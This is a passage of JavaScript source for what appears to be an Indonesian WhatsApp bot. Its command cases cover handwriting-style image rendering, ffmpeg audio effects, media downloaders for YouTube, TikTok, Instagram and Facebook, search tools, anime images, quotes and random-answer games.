							`Kirim perintah *${prefix + command}* Teksnya`
						);
					vipReply(mess.wait);
					const splitText = text.replace(/(\S+\s*){1,9}/g, "$&\n");
					const fixHeight = splitText
						.split("\n")
						.slice(0, 31)
						.join("\n");
					spawn("convert", [
						"./src/nulis/images/buku/sebelumkanan.jpg",
						"-font",
						"./src/nulis/font/Indie-Flower.ttf",
						"-size",
						"960x1280",
						"-pointsize",
						"23",
						"-interline-spacing",
						"2",
						"-annotate",
						"+128+129",
						fixHeight,
						"./src/nulis/images/buku/setelahkanan.jpg"
					])
						.on("error", () => m.reply(mess.error))
						.on("exit", () => {
							xzuya.sendMessage(
								m.chat,
								{
									image: fs.readFileSync(
										"./src/nulis/images/buku/setelahkanan.jpg"
									),
									caption:
										"Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ"
								},
								{ quoted: m }
							);
						});
					db.users[m.sender].limit -= 1;
				}
				break;
			case "foliokiri":
				{
					await jeda(2000);
					if (!text)
						return m.reply(
							`Kirim perintah *${prefix + command}* Teksnya`
						);
					vipReply(mess.wait);
					const splitText = text.replace(/(\S+\s*){1,9}/g, "$&\n");
					const fixHeight = splitText
						.split("\n")
						.slice(0, 38)
						.join("\n");
					spawn("convert", [
						"./src/nulis/images/folio/sebelumkiri.jpg",
						"-font",
						"./src/nulis/font/Indie-Flower.ttf",
						"-size",
						"1720x1280",
						"-pointsize",
						"23",
						"-interline-spacing",
						"4",
						"-annotate",
						"+48+185",
						fixHeight,
						"./src/nulis/images/folio/setelahkiri.jpg"
					])
						.on("error", () => m.reply(mess.error))
						.on("exit", () => {
							xzuya.sendMessage(
								m.chat,
								{
									image: fs.readFileSync(
										"./src/nulis/images/folio/setelahkiri.jpg"
									),
									caption:
										"Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ"
								},
								{ quoted: m }
							);
						});
				}
				break;
			case "foliokanan":
				{
					await jeda(2000);
					if (!text)
						return m.reply(
							`Kirim perintah *${prefix + command}* Teksnya`
						);
					vipReply(mess.wait);
					const splitText = text.replace(/(\S+\s*){1,9}/g, "$&\n");
					const fixHeight = splitText
						.split("\n")
						.slice(0, 38)
						.join("\n");
					spawn("convert", [
						"./src/nulis/images/folio/sebelumkanan.jpg",
						"-font",
						"./src/nulis/font/Indie-Flower.ttf",
						"-size",
						"1720x1280",
						"-pointsize",
						"23",
						"-interline-spacing",
						"4",
						"-annotate",
						"+89+190",
						fixHeight,
						"./src/nulis/images/folio/setelahkanan.jpg"
					])
						.on("error", () => m.reply(mess.error))
						.on("exit", () => {
							xzuya.sendMessage(
								m.chat,
								{
									image: fs.readFileSync(
										"./src/nulis/images/folio/setelahkanan.jpg"
									),
									caption:
										"Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ"
								},
								{ quoted: m }
							);
						});
				}
				break;
			case "bass":
			case "blown":
			case "deep":
			case "earrape":
			case "fast":
			case "fat":
			case "nightcore":
			case "reverse":
			case "robot":
			case "slow":
			case "smooth":
			case "tupai":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					try {
						await jeda(2000);
						let set;
						if (/bass/.test(command))
							set =
								"-af equalizer=f=54:width_type=o:width=2:g=20";
						if (/blown/.test(command))
							set = "-af acrusher=.1:1:64:0:log";
						if (/deep/.test(command))
							set = "-af atempo=4/4,asetrate=44500*2/3";
						if (/earrape/.test(command)) set = "-af volume=12";
						if (/fast/.test(command))
							set = '-filter:a "atempo=1.63,asetrate=44100"';
						if (/fat/.test(command))
							set = '-filter:a "atempo=1.6,asetrate=22100"';
						if (/nightcore/.test(command))
							set = "-filter:a atempo=1.06,asetrate=44100*1.25";
						if (/reverse/.test(command))
							set = '-filter_complex "areverse"';
						if (/robot/.test(command))
							set =
								"-filter_complex \"afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75\"";
						if (/slow/.test(command))
							set = '-filter:a "atempo=0.7,asetrate=44100"';
						if (/smooth/.test(command))
							set =
								"-filter:v \"minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120'\"";
						if (/tupai/.test(command))
							set = '-filter:a "atempo=0.5,asetrate=65100"';
						if (/audio/.test(mime)) {
							vipReply(mess.wait);
							let media =
								await xzuya.downloadAndSaveMediaMessage(qmsg);
							let ran = `./database/sampah/${getRandom(".mp3")}`;
							exec(
								`ffmpeg -i ${media} ${set} ${ran}`,
								(err, stderr, stdout) => {
									fs.unlinkSync(media);
									if (err) return m.reply(err);
									let buff = fs.readFileSync(ran);
									xzuya.sendMessage(
										m.chat,
										{ audio: buff, mimetype: "audio/mpeg" },
										{ quoted: m }
									);
									fs.unlinkSync(ran);
								}
							);
						} else {
							m.reply(
								`Balas audio yang ingin diubah dengan caption *${
									prefix + command
								}*`
							);
						}
					} catch (e) {
						console.log(e);
						m.reply("Gagal!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "tinyurl":
			case "shorturl":
			case "shortlink":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text || !isUrl(text))
						return m.reply(
							`Example: ${
								prefix + command
							} https://github.com/xzuyadev/hitori`
						);
					try {
						let anu = await axios.get(
							"https://tinyurl.com/api-create.php?url=" + text
						);
						m.reply("Url : " + anu.data);
					} catch (e) {
						m.reply("Gagal!");
					}
				}
				break;
			case "git":
			case "gitclone":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!args[0])
						return m.reply(
							`Example: ${
								prefix + command
							} https://github.com/xzuyadev/hitori`
						);
					if (!isUrl(args[0]) && !args[0].includes("github.com"))
						return m.reply("Gunakan Url Github!");
					let [, user, repo] =
						args[0].match(
							/(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
						) || [];
					try {
						xzuya
							.sendMessage(
								m.chat,
								{
									document: {
										url: `https://api.github.com/repos/${user}/${repo}/zipball`
									},
									fileName: repo + ".zip",
									mimetype: "application/zip"
								},
								{ quoted: m }
							)
							.catch((e) => m.reply(mess.error));
					} catch (e) {
						m.reply("Gagal!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;

			// Ai Menu
			case "ai": {
				await jeda(2000);
				vipReply(
					`> MOHON MAAF FITUR AI SUDAH DI ALIHKAN MENJADI ${
						prefix + command
					}gptgo`
				);
				break;
			}
			case "simi":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return vipReply(`Example :  ${prefix + command} query`);
					try {
						const hasil = await simi(text);
						m.reply(hasil.success);
					} catch (e) {
						m.reply("Server simi sedang offline!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "gptgo":
			case "gpt4":
			case "openai":
			case "ragbot":
			case "degreeguru":
			case "illama3":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example ${prefix + command} apa itu saham?`
						);
					const sumon = await fai[command](text);
					vipReply(sumon);
					db.users[m.sender].limit -= 1;
				}
				break;

			case "txt2img":
			case "texttoimage":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example: ${prefix + command} anime, HD`
						);
					try {
						await xzuya.sendFileUrl(
							m.chat,
							`https://widipe.com/ai/text2img?text=${encodeURIComponent(
								text
							)}`,
							"Done",
							m
						);
					} catch (e) {
						vipReply("Gagal Create Gambar!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;

			// Search Menu
			case "google":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return vipReply(`Example :  ${prefix + command} query`);
					let search = await googleIt({ query: text });
					let msg = search
						.map(({ title, link, snippet }) => {
							return `*${title}*\n_${link}_\n_${snippet}_`;
						})
						.join("\n\n");
					m.reply(msg);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "gimage":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return vipReply(`Example :  ${prefix + command} query`);
					gis(text, async (err, result) => {
						if (err)
							return m.reply(
								`Image Untuk Query : _${text}_\nTidak Ditemukan!`
							);
						if (result == undefined) {
							m.reply(
								`Image Untuk Query : _${text}_\nTidak Ditemukan!`
							);
						} else if (result.length > 1) {
							let anu = pickRandom(result);
							await xzuya.sendMessage(
								m.chat,
								{
									image: { url: anu.url },
									caption: "Url : " + anu.url
								},
								{ quoted: m }
							);
						} else m.reply("Gagal Mencari Gambar!");
					});
					db.users[m.sender].limit -= 1;
				}
				break;
			case "play":
			case "ytplay":
			case "yts":
			case "ytsearch":
			case "youtubesearch":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example: ${prefix + command} dj komang`
						);
					vipReply(mess.wait);
					const res = await yts.search(text);
					const hasil = pickRandom(res.all);
					const teksnya = `*📍Title:* ${
						hasil.title || "Tidak tersedia"
					}\n*✏Description:* ${
						hasil.description || "Tidak tersedia"
					}\n*🌟Channel:* ${
						hasil.author?.name || "Tidak tersedia"
					}\n*⏳Duration:* ${
						hasil.seconds || "Tidak tersedia"
					} second (${
						hasil.timestamp || "Tidak tersedia"
					})\n*🔎Source:* ${
						hasil.url || "Tidak tersedia"
					}\n\n_note : jika ingin mendownload silahkan_\n_pilih ${prefix}ytmp3 url_video atau ${prefix}ytmp4 url_video_`;
					await xzuya.sendMessage(
						m.chat,
						{ image: { url: hasil.thumbnail }, caption: teksnya },
						{ quoted: m }
					);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "pixiv":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return vipReply(
							`Example :  ${prefix + command} hu tao`
						);
					try {
						let { pixivdl } = require("./lib/pixiv");
						let res = await pixivdl(text);
						vipReply(mess.wait);
						for (let i = 0; i < res.media.length; i++) {
							let caption =
								i == 0
									? `${res.caption}\n\n*By:* ${
											res.artist
									  }\n*Tags:* ${res.tags.join(", ")}`
									: "";
							let mime = (await FileType.fromBuffer(res.media[i]))
								.mime;
							await xzuya.sendMessage(
								m.chat,
								{
									[mime.split("/")[0]]: res.media[i],
									caption,
									mimetype: mime
								},
								{ quoted: m }
							);
						}
					} catch (e) {
						m.reply("Pencarian Tidak ditemukan!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "pinterest":
			case "pint":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return vipReply(
							`Example :  ${prefix + command} hu tao`
						);
					try {
						let anu = await pinterest(text);
						if (anu.length < 1)
							return m.reply("Pencarian tidak ditemukan!");
						await xzuya.sendFileUrl(
							m.chat,
							pickRandom(anu),
							"Nih Ngab",
							m
						);
					} catch (e) {
						let anu = await pinterest2(text);
						let result = pickRandom(anu);
						if (anu.length < 1) {
							m.reply("Pencarian tidak ditemukan!");
						} else {
							await xzuya.sendMessage(
								m.chat,
								{
									image: { url: result.images_url },
									caption: `*Media Url :* ${result.pin}${
										result.link
											? "\n*Source :* " + result.link
											: ""
									}`
								},
								{ quoted: m }
							);
						}
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "wallpaper":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return vipReply(
							`Example :  ${prefix + command} hu tao`
						);
					try {
						let anu = await wallpaper(text);
						let result = pickRandom(anu);
						if (anu.length < 1) {
							m.reply("Pencarian tidak ditemukan!");
						} else {
							await xzuya.sendMessage(
								m.chat,
								{
									image: { url: result.image[0] },
									caption: `⭔ title : ${q}\n⭔ category : ${
										result.type
									}\n⭔ media url : ${
										result.image[2] ||
										result.image[1] ||
										result.image[0]
									}`
								},
								{ quoted: m }
							);
						}
					} catch (e) {
						m.reply("Server wallpaper sedang offline!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "ringtone":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example: ${prefix + command} black rover`
						);
					let anu = await ringtone(text);
					let result = pickRandom(anu);
					await xzuya.sendMessage(
						m.chat,
						{
							audio: { url: result.audio },
							fileName: result.title + ".mp3",
							mimetype: "audio/mpeg"
						},
						{ quoted: m }
					);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "npm":
			case "npmjs":
				{
					await jeda(2000);
					if (!text)
						return vipReply(`Example :  ${prefix + command} axios`);
					let res = await fetch(
						`http://registry.npmjs.com/-/v1/search?text=${text}`
					);
					let { objects } = await res.json();
					if (!objects.length)
						return m.reply("Pencarian Tidak di temukan");
					let txt = objects.map(({ package: pkg }) => {
						return `*${pkg.name}* (v${pkg.version})\n_${pkg.links.npm}_\n_${pkg.description}_`;
					}).join`\n\n`;
					m.reply(txt);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "style":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					if (!text)
						return vipReply(`Example :  ${prefix + command} xzuya`);
					let anu = await styletext(text);
					let txt = anu.map((a) => `*${a.name}*\n${a.result}`)
						.join`\n\n`;
					m.reply(txt);
					db.users[m.sender].limit -= 1;
				}
				break;

			// Downloader Menu
			case "ytmp3":
			case "ytaudio":
			case "ytplayaudio":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					if (!isPremium) return m.reply(mess.prem);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example: ${prefix + command} url_youtube`
						);
					if (!text.includes("youtu"))
						return m.reply(
							"Url Tidak Mengandung Result Dari Youtube!"
						);
					vipReply(mess.wait);
					try {
						const hasil = await ytMp3(text);
						await xzuya.sendMessage(
							m.chat,
							{
								audio: { url: hasil.result },
								mimetype: "audio/mpeg",
								contextInfo: {
									externalAdReply: {
										title: hasil.title,
										body: hasil.channel,
										previewType: "PHOTO",
										thumbnailUrl: hasil.thumb,
										mediaType: 1,
										renderLargerThumbnail: true,
										sourceUrl: text
									}
								}
							},
							{ quoted: m }
						);
					} catch (e) {
						try {
							const anu = new Ytdl();
							const hasil = await anu.play(text);
							const hasil_url =
								Object.values(hasil.audio).find(
									(v) => v.size === "128kbps"
								)?.url || Object.values(hasil.audio)[0]?.url;
							await xzuya.sendMessage(
								m.chat,
								{
									audio: { url: hasil_url },
									mimetype: "audio/mpeg"
								},
								{ quoted: m }
							);
						} catch (e) {
							try {
								const hasil = await allDl(text, {
									isAudioOnly: true
								});
								await xzuya.sendMessage(
									m.chat,
									{
										audio: { url: hasil.url },
										mimetype: "audio/mpeg"
									},
									{ quoted: fkontak }
								);
							} catch (e) {
								vipReply("Gagal Mendownload Audio!");
							}
						}
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "twitterdl":
				{
					if (!text) return vipReply(`Mana link twitternya?`);
					const sumon = await download.twitter(text);
					xzuya.sendFileUrl(m.chat, sumon, "Done", fkontak);
				}
				break;
			case "ytmp4":
			case "ytvideo":
			case "ytplayvideo":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!isPremium) return m.reply(mess.prem);
					if (!text)
						return vipReply(
							`Example: ${prefix + command} url_youtube`
						);
					if (!text.includes("youtu"))
						return m.reply(
							"Url Tidak Mengandung Result Dari Youtube!"
						);
					vipReply(mess.wait);
					try {
						const hasil = await ytMp4(text);
						await xzuya.sendMessage(
							m.chat,
							{
								video: { url: hasil.result },
								caption: `*📍Title:* ${
									hasil.title
								}\n*✏Description:* ${
									hasil.desc ? hasil.desc : ""
								}\n*🚀Channel:* ${
									hasil.channel
								}\n*🗓Upload at:* ${hasil.uploadDate}`
							},
							{ quoted: fkontak }
						);
					} catch (e) {
						try {
							const anu = new Ytdl();
							const hasil = await anu.play(text);
							const hasil_url =
								Object.values(hasil.video).find(
									(v) => v.size === "auto"
								)?.url || Object.values(hasil.video)[0]?.url;
							await xzuya.sendMessage(
								m.chat,
								{ video: { url: hasil_url } },
								{ quoted: fkontak }
							);
						} catch (e) {
							try {
								const hasil = await allDl(text);
								await xzuya.sendMessage(
									m.chat,
									{ video: { url: hasil.url } },
									{ quoted: m }
								);
							} catch (e) {
								m.reply("Gagal Mendownload Video!");
							}
						}
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "ig":
			case "instagram":
			case "instadl":
			case "igdown":
			case "igdl":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example: ${prefix + command} url_instagram`
						);
					if (!text.includes("instagram.com"))
						return m.reply(
							"Url Tidak Mengandung Result Dari Instagram!"
						);
					const sumon = await download.ig(text);
					xzuya.sendFileUrl(m.chat, sumon[0], sumon[1], fkontak);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "igstory":
			case "instagramstory":
			case "instastory":
			case "storyig":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example: ${prefix + command} usernamenya`
						);
					try {
						const hasil = await instaStory(text);
						vipReply(mess.wait);
						for (let i = 0; i < hasil.results.length; i++) {
							await xzuya.sendFileUrl(
								m.chat,
								hasil.results[i].url,
								"Done",
								m
							);
						}
					} catch (e) {
						m.reply("Username tidak ditemukan atau Privat!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "tiktok":
			case "tiktokdown":
			case "ttdown":
			case "ttdl":
			case "tt":
			case "ttmp4":
			case "ttvideo":
			case "tiktokmp4":
			case "tiktokvideo":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example: ${prefix + command} url_tiktok`
						);
					if (!text.includes("tiktok.com"))
						return m.reply(
							"Url Tidak Mengandung Result Dari Tiktok!"
						);
					try {
						const hasil = await tiktokDl(text);
						vipReply(mess.wait);
						if (hasil && hasil.size_nowm) {
							await xzuya.sendFileUrl(
								m.chat,
								hasil.data[1].url,
								`*📍Title:* ${hasil.title}\n*⏳Duration:* ${hasil.duration}\n*🎃Author:* ${hasil.author.nickname} (@${hasil.author.fullname})`,
								m
							);
						} else {
							for (let i = 0; i < hasil.data.length; i++) {
								await xzuya.sendFileUrl(
									m.chat,
									hasil.data[i].url,
									`*🚀Image:* ${i + 1}`,
									m
								);
							}
						}
					} catch (e) {
						m.reply("Gagal/Url tidak valid!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "ttmp3":
			case "tiktokmp3":
			case "ttaudio":
			case "tiktokaudio":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example: ${prefix + command} url_tiktok`
						);
					if (!text.includes("tiktok.com"))
						return m.reply(
							"Url Tidak Mengandung Result Dari Tiktok!"
						);
					try {
						const hasil = await tiktokDl(text);
						vipReply(mess.wait);
						await xzuya.sendMessage(
							m.chat,
							{
								audio: { url: hasil.music_info.url },
								mimetype: "audio/mpeg",
								contextInfo: {
									externalAdReply: {
										title:
											"TikTok • " + hasil.author.nickname,
										body:
											hasil.stats.likes +
											" suka, " +
											hasil.stats.comment +
											" komentar. " +
											hasil.title,
										previewType: "PHOTO",
										thumbnailUrl: hasil.cover,
										mediaType: 1,
										renderLargerThumbnail: true,
										sourceUrl: text
									}
								}
							},
							{ quoted: m }
						);
					} catch (e) {
						m.reply("Gagal/Url tidak valid!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "fb":
			case "fbdl":
			case "fbdown":
			case "facebook":
			case "facebookdl":
			case "facebookdown":
			case "fbdownload":
			case "fbmp4":
			case "fbvideo":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example: ${prefix + command} url_facebook`
						);
					if (!text.includes("facebook.com"))
						return m.reply(
							"Url Tidak Mengandung Result Dari Facebook!"
						);
					try {
						const hasil = await facebookDl(text);
						if (hasil.results.length < 1) {
							m.reply("Video Tidak ditemukan!");
						} else {
							vipReply(mess.wait);
							await xzuya.sendFileUrl(
								m.chat,
								hasil.results[0].url,
								`*🎐Title:* ${hasil.caption}`,
								m
							);
						}
					} catch (e) {
						m.reply("Server downloader facebook sedang offline!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "mediafire":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example: ${
								prefix + command
							} https://www.mediafire.com/file/xxxxxxxxx/xxxxx.zip/file`
						);
					if (!isUrl(args[0]) && !args[0].includes("mediafire.com"))
						return m.reply("Url Invalid!");
					try {
						const anu = await mediafireDl(text);
						await xzuya.sendMessage(
							m.chat,
							{
								document: { url: anu[0].link },
								caption: `*MEDIAFIRE DOWNLOADER*\n\n*${setv} Name* : ${anu[0].name}\n*${setv} Size* : ${anu[0].size}\n*${setv} Type* : ${anu[0].type}\n*${setv} Link* : ${anu[0].link}`,
								fileName: anu[0].name,
								mimetype: anu[0].type
							},
							{ quoted: m }
						);
					} catch (e) {
						m.reply("Server download sedang offline!");
					}
					db.users[m.sender].limit -= 1;
				}
				break;

			// Quotes Menu
			case "motivasi":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync(
								"./database/kata-kata/motivasi.json"
							)
						)
					);
					m.reply(hasil);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "quotes":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync("./database/kata-kata/quotes.json")
						)
					);
					m.reply(`_${hasil.quotes}_\n\n*- ${hasil.author}*`);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "truth":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync("./database/kata-kata/truth.json")
						)
					);
					m.reply(`_${hasil}_`);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "renungan":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync(
								"./database/kata-kata/renungan.json"
							)
						)
					);
					m.reply("", {
						contextInfo: {
							forwardingScore: 10,
							isForwarded: true,
							externalAdReply: {
								title: m.pushName || "Anonim",
								thumbnailUrl: hasil,
								mediaType: 1,
								previewType: "PHOTO",
								renderLargerThumbnail: true
							}
						}
					});
					db.users[m.sender].limit -= 1;
				}
				break;

			// Random Menu
			case "randomcolor":
			case "color":
			case "warnarandom":
			case "warna":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					vipReply(mess.wait);
					let anu = await fetchJson(
						`https://api.popcat.xyz/randomcolor`
					);
					await xzuya.sendFileUrl(
						m.chat,
						anu.image,
						`*Nama Warna : ${anu.name}*\n*Code : ${anu.hex}*`,
						m
					);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "coffe":
			case "kopi":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					await xzuya.sendFileUrl(
						m.chat,
						"https://coffee.alexflipnote.dev/random",
						"☕ Random Coffe",
						fkontak
					);
					db.users[m.sender].limit -= 1;
				}
				break;

			// Anime Menu
			case "waifu":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (text == "nsfw") {
						const res = await fetchJson(
							"https://api.waifu.pics/nsfw/waifu"
						);
						await xzuya.sendFileUrl(
							m.chat,
							res.url,
							"Random Waifu",
							m
						);
					} else {
						const res = await fetchJson(
							"https://api.waifu.pics/sfw/waifu"
						);
						await xzuya.sendFileUrl(
							m.chat,
							res.url,
							"Random Waifu",
							m
						);
					}
					db.users[m.sender].limit -= 1;
				}
				break;
			case "neko":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (text == "nsfw") {
						const res = await fetchJson(
							"https://api.waifu.pics/nsfw/neko"
						);
						await xzuya.sendFileUrl(
							m.chat,
							res.url,
							"Random Waifu",
							m
						);
					} else {
						const res = await fetchJson(
							"https://api.waifu.pics/sfw/neko"
						);
						await xzuya.sendFileUrl(
							m.chat,
							res.url,
							"Random Neko",
							m
						);
					}
					db.users[m.sender].limit -= 1;
				}
				break;

			// Fun Menu
			case "dadu":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					let ddsa = [
						{
							url: "https://telegra.ph/file/9f60e4cdbeb79fc6aff7a.png",
							no: 1
						},
						{
							url: "https://telegra.ph/file/797f86e444755282374ef.png",
							no: 2
						},
						{
							url: "https://telegra.ph/file/970d2a7656ada7c579b69.png",
							no: 3
						},
						{
							url: "https://telegra.ph/file/0470d295e00ebe789fb4d.png",
							no: 4
						},
						{
							url: "https://telegra.ph/file/a9d7332e7ba1d1d26a2be.png",
							no: 5
						},
						{
							url: "https://telegra.ph/file/99dcd999991a79f9ba0c0.png",
							no: 6
						}
					];
					let media = pickRandom(ddsa);
					await xzuya.sendAsSticker(m.chat, media.url, m, {
						packname: packname,
						author: author,
						isAvatar: 1
					});
					db.users[m.sender].limit -= 1;
				}
				break;
			case "halah":
			case "hilih":
			case "huluh":
			case "heleh":
			case "holoh":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!m.quoted && !text)
						return m.reply(
							`Kirim/reply text dengan caption ${
								prefix + command
							}`
						);
					ter = command[1].toLowerCase();
					tex = m.quoted
						? m.quoted.text
							? m.quoted.text
							: q
							? q
							: m.text
						: q
						? q
						: m.text;
					m.reply(
						tex
							.replace(/[aiueo]/g, ter)
							.replace(/[AIUEO]/g, ter.toUpperCase())
					);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "bisakah":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example : ${prefix + command} saya menang?`
						);
					let bisa = [
						"Bisa",
						"Coba Saja",
						"Pasti Bisa",
						"Mungkin Saja",
						"Tidak Bisa",
						"Tidak Mungkin",
						"Coba Ulangi",
						"Ngimpi kah?",
						"yakin bisa?"
					];
					let keh = bisa[Math.floor(Math.random() * bisa.length)];
					m.reply(`*Bisakah ${text}*\nJawab : ${keh}`);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "apakah":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example : ${prefix + command} saya bisa menang?`
						);
					let apa = [
						"Iya",
						"Tidak",
						"Bisa Jadi",
						"Coba Ulangi",
						"Mungkin Saja",
						"Mungkin Tidak",
						"Mungkin Iya",
						"Ntahlah"
					];
					let kah = apa[Math.floor(Math.random() * apa.length)];
					m.reply(`*${command} ${text}*\nJawab : ${kah}`);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "kapan":
			case "kapankah":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example : ${prefix + command} saya menang?`
						);
					let kapan = [
						"Besok",
						"Lusa",
						"Nanti",
						"4 Hari Lagi",
						"5 Hari Lagi",
						"6 Hari Lagi",
						"1 Minggu Lagi",
						"2 Minggu Lagi",
						"3 Minggu Lagi",
						"1 Bulan Lagi",
						"2 Bulan Lagi",
						"3 Bulan Lagi",
						"4 Bulan Lagi",
						"5 Bulan Lagi",
						"6 Bulan Lagi",
						"1 Tahun Lagi",
						"2 Tahun Lagi",
						"3 Tahun Lagi",
						"4 Tahun Lagi",
						"5 Tahun Lagi",
						"6 Tahun Lagi",
						"1 Abad lagi",
						"3 Hari Lagi",
						"Bulan Depan",
						"Ntahlah",
						"Tidak Akan Pernah"
					];
					let koh = kapan[Math.floor(Math.random() * kapan.length)];
					m.reply(`*${command} ${text}*\nJawab : ${koh}`);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "tanyakerang":
			case "kerangajaib":
			case "kerang":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(
							`Example : ${prefix + command} boleh pinjam 100?`
						);
					let krng = [
						"Mungkin suatu hari",
						"Tidak juga",
						"Tidak keduanya",
						"Kurasa tidak",
						"Ya",
						"Tidak",
						"Coba tanya lagi",
						"Tidak ada"
					];
					let jwb = pickRandom(krng);
					m.reply(`*Pertanyaan : ${text}*\n*Jawab : ${jwb}*`);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "cekmati":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(`Example : ${prefix + command} nama lu`);
					let teksnya = text
						.replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, "")
						.replace(/\d/g, "");
					let { data } = await axios.get(
						`https://api.agify.io/?name=${
							teksnya ? teksnya : "bot"
						}`
					);
					let jawab = `Nama : ${text}\n*Mati Pada Umur :* ${
						data.age == null
							? Math.floor(Math.random() * 90) + 20
							: data.age
					} Tahun.\n\n_Cepet Cepet Tobat Bro_\n_Soalnya Mati ga ada yang tau_`;
					m.reply(jawab);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "ceksifat":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (cekLimit(m, db)) return m.reply(mess.limit);
					let sifat_a = [
						"Bijak",
						"Sabar",
						"Kreatif",
						"Humoris",
						"Mudah bergaul",
						"Mandiri",
						"Setia",
						"Jujur",
						"Dermawan",
						"Idealis",
						"Adil",
						"Sopan",
						"Tekun",
						"Rajin",
						"Pemaaf",
						"Murah hati",
						"Ceria",
						"Percaya diri",
						"Penyayang",
						"Disiplin",
						"Optimis",
						"Berani",
						"Bersyukur",
						"Bertanggung jawab",
						"Bisa diandalkan",
						"Tenang",
						"Kalem",
						"Logis"
					];
